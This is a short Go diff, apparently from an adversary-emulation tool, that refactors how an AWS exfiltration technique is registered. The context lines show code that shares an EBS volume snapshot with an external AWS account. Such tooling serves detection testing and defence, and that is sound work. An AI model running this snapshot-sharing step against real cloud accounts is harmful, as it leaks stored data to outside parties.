@@ -17,7 +17,7 @@ import (
 var tf []byte
 
 func init() {
-	stratus.RegisterAttackTechnique(&stratus.AttackTechnique{
+	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
 		Name:               "aws.exfiltration.ebs-snapshot-shared-with-external-account",
 		Platform:           stratus.AWS,
 		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
@@ -43,6 +43,7 @@ func detonate(terraformOutputs map[string]string) error {
 
 	// Exfiltrate it
 	log.Println("Sharing the volume snapshot with an external AWS account ID...")
+
 	_, err = ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
 		SnapshotId: aws.String(ourSnapshotId),
 		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
